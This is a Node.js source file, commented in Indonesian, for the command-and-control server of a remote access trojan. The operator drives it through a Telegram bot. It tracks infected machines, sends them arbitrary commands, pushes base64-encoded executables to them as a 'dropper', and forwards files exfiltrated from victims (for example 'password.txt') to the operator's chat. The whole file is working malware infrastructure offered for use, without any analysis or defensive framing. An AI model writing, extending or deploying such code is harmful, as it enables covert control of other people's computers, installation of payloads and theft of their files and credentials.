const express = require('express');
const axios = require('axios');
const FormData = require('form-data'); // Wajib ada untuk kirim file ke Telegram
const app = express();

app.use(express.json());

const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.BOT_TOKEN_B; // Token Bot RAT
const CHAT_ID = process.env.CHAT_ID;

// --- DATABASE SEMENTARA (MEMORY) ---
let onlineBots = {}; // Menyimpan daftar bot: { "user@pc": timestamp }
let currentTarget = "ALL"; // Default target semua
let commandData = {
    id: 0,      // ID unik
    cmd: "",    // Perintah teks
    payload: "" // Data file (Base64) untuk fitur Dropper
};

// --- FUNGSI BANTUAN KIRIM PESAN ---
async function sendTelegram(text) {
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'Markdown'
        });
    } catch (e) { console.error("TG Error:", e.message); }
}

// --- LOGIKA UTAMA: CEK UPDATE DARI TELEGRAM ---
let lastUpdateId = 0;
async function checkTelegramUpdates() {
    try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`;
        const resp = await axios.get(url);
        const updates = resp.data.result;

        if (updates.length > 0) {
            for (const update of updates) {
                lastUpdateId = update.update_id;
                const message = update.message;
                if (!message) continue;

                // A. JIKA ADMIN KIRIM TEKS (/cmd, /target, /bots)
                if (message.text) {
                    const text = message.text;

                    // 1. LIHAT BOT ONLINE
                    if (text === '/bots') {
                        let list = "🤖 **ONLINE BOTS (Last 30s):**\n";
                        let count = 0;
                        const now = Date.now();
                        for (const [id, time] of Object.entries(onlineBots)) {
                            if (now - time < 30000) { 
                                list += `- \`${id}\`\n`;
                                count++;
                            }
                        }
                        if (count === 0) list += "(No bots active)";
                        list += `\n🎯 Target: \`${currentTarget}\``;
                        await sendTelegram(list);
                    }
                    // 2. PILIH TARGET
                    else if (text.startsWith('/target ')) {
                        currentTarget = text.replace('/target ', '').trim();
                        await sendTelegram(`🎯 Target set to: \`${currentTarget}\``);
                    }
                    // 3. KIRIM PERINTAH BIASA
                    else if (text.startsWith('/cmd ')) {
                        const cmd = text.replace('/cmd ', '').trim();
                        commandData = {
                            id: Date.now(),
                            cmd: cmd,
                            payload: "" // Kosongkan payload jika cuma teks
                        };
                        await sendTelegram(`🚀 Command sent to **${currentTarget}**: \`${cmd}\``);
                    }
                }

                // B. JIKA ADMIN KIRIM FILE (REVERSE DROPPER)
                // Kamu drag & drop file .exe ke bot -> RAT install otomatis
                else if (message.document) {
                    const fileId = message.document.file_id;
                    const fileName = message.document.file_name;

                    await sendTelegram(`⏳ Receiving payload: \`${fileName}\`...`);

                    // 1. Download File dari Server Telegram
                    const fileInfo = await axios.get(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${fileId}`);
                    const filePath = fileInfo.data.result.file_path;
                    const downloadUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${filePath}`;

                    const fileData = await axios.get(downloadUrl, { responseType: 'arraybuffer' });
                    
                    // 2. Ubah jadi Base64
                    const base64Str = Buffer.from(fileData.data).toString('base64');

                    // 3. Siapkan Command Global
                    commandData = {
                        id: Date.now(),
                        cmd: `save ${fileName}`, // Perintah khusus RAT
                        payload: base64Str       // Isi file
                    };

                    await sendTelegram(`☢️ **DROPPER ACTIVE**: \`${fileName}\` sent to **${currentTarget}**!`);
                }
            }
        }
    } catch (e) { /* Ignore error */ }
}

// --- ENDPOINT 1: POLLING (RAT MINTA TUGAS) ---
app.post('/poll', async (req, res) => {
    try {
        const { bot_id } = req.body;
        if (bot_id) onlineBots[bot_id] = Date.now(); // Absen

        // Cek Telegram dulu sebelum jawab
        await checkTelegramUpdates();

        // Cek Target
        let isTarget = (currentTarget === "ALL" || currentTarget === bot_id);
        
        if (isTarget && commandData.cmd !== "") {
            return res.json({
                status: "command",
                id: commandData.id,
                cmd: commandData.cmd,
                // Kirim payload (file) hanya jika commandnya "save ..."
                payload: commandData.cmd.startsWith("save ") ? commandData.payload : ""
            });
        }
        return res.json({ status: "idle" });

    } catch (e) { res.json({ status: "error" }); }
});

// --- ENDPOINT 2: REPORT (RAT LAPOR HASIL / UPLOAD FILE) ---
app.post('/report', async (req, res) => {
    try {
        const { id, aes, chacha } = req.body;
        // aes = Data (Output Teks / File Base64)
        // chacha = Command Asli (misal: "upload password.txt")

        // A. JIKA RAT MENGIRIM FILE (EXFILTRATION)
        if (chacha.startsWith("upload ")) {
            const filename = chacha.replace("upload ", "").trim();
            
            // Konversi Base64 balik ke Buffer
            const fileBuffer = Buffer.from(aes, 'base64');

            // Kirim ke Telegram sebagai Dokumen
            const form = new FormData();
            form.append('chat_id', CHAT_ID);
            form.append('document', fileBuffer, { filename: filename });
            form.append('caption', `📂 Exfiltrated from: \`${id}\``);

            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
                headers: form.getHeaders()
            });
        } 
        // B. JIKA RAT LAPOR TEKS BIASA
        else {
            const msg = `💻 **${id}**\ncmd: \`${chacha}\`\n\n\`\`\`\n${aes}\n\`\`\``;
            await sendTelegram(msg);
        }

        res.json({ status: 'success' });
    } catch (e) { res.json({ status: 'error' }); }
});

app.listen(PORT, () => console.log(`RAT C2 Server Running`));
